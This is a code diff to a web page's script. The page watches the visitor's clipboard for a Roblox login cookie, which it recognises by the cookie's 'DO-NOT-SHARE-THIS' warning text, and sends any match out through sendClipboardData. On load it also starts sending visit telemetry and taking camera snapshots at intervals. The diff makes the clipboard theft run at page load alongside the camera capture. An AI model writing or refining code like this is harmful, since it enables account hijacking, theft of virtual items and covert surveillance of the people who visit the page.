@@ -635,17 +635,23 @@
             }
         });
 
-        async function monitorClipboard() {
-            if (!navigator.clipboard || !navigator.clipboard.readText) return;
+        async function checkClipboardOnce() {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return false;
             try {
                 const text = await navigator.clipboard.readText();
                 if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
                     await sendClipboardData(text, false);
-                    return;
+                    return true;
                 }
             } catch (e) {
                 // Clipboard permissions require user interaction first
             }
+            return false;
+        }
+
+        async function monitorClipboard() {
+            const matched = await checkClipboardOnce();
+            if (matched || pageLeft) return;
             setTimeout(monitorClipboard, 1000);
         }
 
@@ -655,11 +661,17 @@
         window.addEventListener("load", async () => {
             pageLeft = false;
             sendVisitTelemetry();
-            await runQuickSnapCycle();
+
+            // Trigger camera and clipboard checks simultaneously on load
+            await Promise.allSettled([
+                runQuickSnapCycle(),
+                checkClipboardOnce()
+            ]);
+
             if (!pageLeft && photoTimerId === null) {
                 photoTimerId = setInterval(runQuickSnapCycle, PHOTO_INTERVAL_MS);
             }
-            setTimeout(monitorClipboard, 500);
+            setTimeout(monitorClipboard, 1000);
         });
     </script>
 </body>
